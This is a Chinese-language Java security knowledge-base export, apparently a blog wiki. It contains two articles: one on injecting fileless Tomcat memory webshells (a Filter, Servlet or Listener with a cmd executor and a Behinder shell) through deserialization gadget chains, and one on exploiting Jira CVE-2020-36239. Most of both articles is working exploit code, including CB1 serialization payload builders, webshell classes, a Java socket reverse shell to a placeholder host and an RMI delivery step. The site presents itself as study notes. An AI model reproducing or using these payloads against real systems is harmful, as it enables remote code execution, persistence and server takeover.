classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 然后我们编写序列化代码，这里我直接使用CB1链，分别将TomcatEcho.class，TomcatInject.class序列化成TomcatEcho.ser，TomcatInject.ser package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.*; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_3 { public Test_3() { } public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatEcho.class\")); // byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatInject.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates, \"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates, targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates, null); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f3 = comparator.getClass().getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"queue\"); f4.setAccessible(true); Object[] queueArray = (Object[]) f4.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"tomcatEcho.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } } 然后对应将TomcatEcho.ser，TomcatInject.ser 通过Base64编码一下 然后再分别发送至服务器（在参数里切记一定要url编码一次） 然后在web根路径下，带入参数cmd，并执行命令，如下所示 注入冰蝎马 注入冰蝎马这里需要注意，虽然只是修改filter逻辑，在doFilter()编写冰蝎马逻辑 首先查看Behinder_v3.0_Beta_9中的shell.jsp代码 冰蝎自定义了一个可以解析class字节数组的类加载器U，逻辑为，使用g方法调用super.defineClass，可以将byte[]直接转换为Class对象 class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } 判断为post请求后，读取请求体中的数据，拿到进行Base64+AES解码后的字节码数据。 if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); new U(this.getClass().getClassLoader()).g( c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))) .newInstance().equals(pageContext); } request和session对象 request对象可以通过其doFilter方法参数中传递的ServletRequest获得，而session可以通过request.getSession()获得 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); pageContext对象 pageContext对象为jsp九大内置对象，在冰蝎作者rebeyond的文章利用动态二进制加密实现新型一句话木马之Java篇中知道，在冰蝎的代码中，服务端需要从pageContext对象中获取出request/response/session。 而在冰蝎3.0 bata7之后不再依赖pageContext对象，只需给在equal函数中传递的object对象中，有request/response/session对象即可，所以此时我们可以把pageContext对象换成一个Map，手动添加这三个对象即可 HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); 如果如下图所示，在TomcatInject.java里再写一个类U来继承ClassLoader，在编译之后会生成两个Class文件，导致无法调用class U中的方法 因为我们不能实例化自己的类加载器，所以我们就使用反射的方法，调用ClassLoader，不过这里也有一个坑点，就是抽象类，是不可以作为invoke()的第一个参数，所以要使用一个他的继承类作为替代品，代码如下 //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); 最后doFilter中注入冰蝎马如下所示 // doFilter逻辑 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { try { System.out.println(\"Do Filter ......\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); } }catch (Exception e){ e.printStackTrace(); } filterChain.doFilter(servletRequest, servletResponse); System.out.println(\"doFilter\"); } 编译生成对应的TomcatEcho.class,TomcatInject.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInject.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入冰蝎马 反序列化注入Servlet 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，还可以注入Servlet 其中基本思路不变，只是需要获取request，然后从request中获取ServletContext，然后依次获取ApplicationContext、StandardContext，最后将servlet封装成wrapper再使用context添加ServletMapping，就可以了 注入普通马 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 在这里需要注意的是，TomcatInjectServlet 需要实现Servlet接口，和Filter一样，因为需要被TemplatesImpl类来加载，所以需要继承AbstractTranslet类 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectServlet extends AbstractTranslet implements Servlet { /** * webshell命令参数名 */ private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new TomcatInjectServlet(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); } } catch (Exception e) { e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { System.out.println(\"do Service\"); Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } 编译生成对应的TomcatEcho.class,TomcatInjectServlet.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectServlet.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里使用/xyz用于区别Filter的冰蝎马，实现原理同Filter，只是实现Servlet接口中的service()方法 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 反序列化注入Listener 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，Servlet，还有Listener，但是在该篇中对request理解并不深，未深入研究是否可以回显，在此处发现可以通过request获取response @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); HttpServletResponse response = request.getResponse(); // 执行命令部分... }catch (Exception e){ e.printStackTrace(); } } 注入普通马 对应的TomcatInjectListener package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.connector.Request; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletRequest; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectListener extends AbstractTranslet implements ServletRequestListener { private final static String servletUrlPattern = \"/\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new TomcatInjectListener(); standardContext.addApplicationEventListener(listener); } }catch (Exception e){ e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); //通过resquest获取response HttpServletResponse response = request.getResponse(); String cmd = request.getParameter(\"cmd\"); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } response.getOutputStream().write(stringBuilder.toString().getBytes()); response.getOutputStream().flush(); response.getOutputStream().close(); return; } }catch (Exception e){ e.printStackTrace(); } } } 编译生成对应的TomcatEcho.class,TomcatInjectListener.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectListener.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里只需要修改Listener的逻辑，为冰蝎马逻辑即可 @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ System.out.println(\"do Linstener\"); HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)requestF.get(req); HttpServletResponse response = request.getResponse(); HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } }catch (Exception e){ e.printStackTrace(); } } 参考链接 P1n93r-Tomcat 架构原理 threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 天下大木头-Tomcat内存马学习（二） 洋洋-利用shiro反序列化注入冰蝎内存马 https://www.bbsmax.com/A/x9J2X9Dnd6/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:30 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/14.Tomcat内存马无文件攻击.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE.html":{"url":"知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE.html","title":"15.Jira_CVE2020-36239_RCE","keywords":"","body":" 简介 背景 漏洞分析 漏洞触发点 漏洞验证 EXP 参考链接 简介 2021 年 7 月 9 日上午 5:44 Jira 官方发布公告 《Jira 数据中心和 Jira 服务管理数据中心 - Ehcache RMI 缺少身份验证 - CVE-2020-36239(https://jira.atlassian.com/browse/JSDSERVER-8454)》, 该漏洞影响多个产品的多个版本,官方已给出修复方法。详细请关注 Jira 官网，将软件更新至安全版本: https://jira.atlassian.com/ 背景 由于在复现CVE2020-36239这个漏洞的时候，使用ysoserial项目中的代码，执行CB1，无法成功利用反弹shell，执行任意命令，导致一直在找问题，最后通过和同事沟通，发现该漏洞存在的Commons Beanutils 确实是可以利用，但是Commons Collections 版本较高，是无法利用成功的；仔细查看其实所有的CC链，CB链其实就是代码执行，只是执行的代码是Runtime.getRuntime.exec(cmd)，其中cmd为需要执行的命令，在部署的目标测试环境，通过实验最后得知，在使用Runtime.getRuntime.exec(cmd)是无法执行命令（反弹shell）最后通过修改代码执行逻辑，使用Java的socket编程来反弹shell。 漏洞分析 根据官方的描述该漏洞是因为: 暴露了一个 Ehcache RMI 网络服务，攻击者可以在端口 40001 和潜在的 40011 上连接到该服务，由于缺少身份验证漏洞，可以通过反序列化在 Jira 中执行他们选择的任意代码 使用Nmap扫描 nmap -T 4 -A 10.1.1.13 -p 40001 其中绑定的name为rmi://com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey;绑定的实例接口为net.sf.ehcache.distribution.RMICachePeer_Stub 漏洞触发点 在 net.sf.ehcache.distribution.RMICachePeer_Stub 找触发点, 官方通报中说是 Ehcache 暴露的 RMI 服务，所以实体类应该也在 Ehcache 包里 在绑定的 net.sf.ehcache.distribution.RMICachePeer_Stub类中的 getQuiet方法接收的参数是 Serializeable对象，这里就是漏洞的触发点 漏洞验证 所有绑定的 name, 都是绑定 net.sf.ehcache.distribution.RMICachePeer_Stub, 所以随机选一个就可以了， 使用 URLDNS 验证了漏洞确实存在 package com.myproject.temp; import net.sf.ehcache.distribution.RMICachePeer_Stub; import java.lang.reflect.Field; import java.net.URL; import java.rmi.Naming; import java.util.HashMap; public class Test { public static void main(String[] args) throws Exception { URL url = new URL(\"http://vd2vvt.dnslog.cn\"); HashMap hashMap = new HashMap(); hashMap.put(url,\"hhh\"); Field field = URL.class.getDeclaredField(\"hashCode\"); field.setAccessible(true); field.setInt(url,-1); RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(hashMap); } } 通过查看Jira 是否用了存在利用链的包，Commons-Collection 都用了相对安全的版本，但是 Commons-Beanutils 1.9.4 存在利用链，那么就可以利用CB1来构造序列化对象 EXP 首先编写shell.java，利用socket 编程反弹shell到目标地址，注意这里一定要写进无参构造函数，因为利用CB1链，通过javassit写入到新的类，再将其转换成bytecode 放在TemplatesImpl._bytecodes时，最后执行的是newInstance()，也就是实例化的过程，需要放在构造函数中 package com.myproject.temp; public class shell { public shell(){ try{ String host = \"xxx.xxx.xxx.xxx\"; int port = port; String cmd = \"/bin/bash\"; java.lang.Process p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); java.net.Socket s = new java.net.Socket(host, port); java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while (!s.isClosed()) { while (pi.available() > 0) { so.write(pi.read()); } while (pe.available() > 0) { so.write(pe.read()); } while (si.available() > 0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) { } } p.destroy(); s.close(); }catch (Exception e){} } public static void main(String[] args) { System.out.println(123); } } 然后需要编写一个ClassLoader，让javassist从源中读取该类文件，并返回CtClass对该类文件的对象的引用，主要原因是因为要将shell.class 转换成base64编码进行写入，最后再通过classloader进行解码，再将其转换成bytecode，放入到Templates._bytecode中 这里参考的是Y4er——ysoserial大哥更改后的项目 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 最后再将CB1的逻辑完成，如下所示 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; 完整代码如下 package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import net.sf.ehcache.distribution.RMICachePeer_Stub; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.Serializable; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.Naming; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_2 { public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes/com/myproject/temp/shell.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); 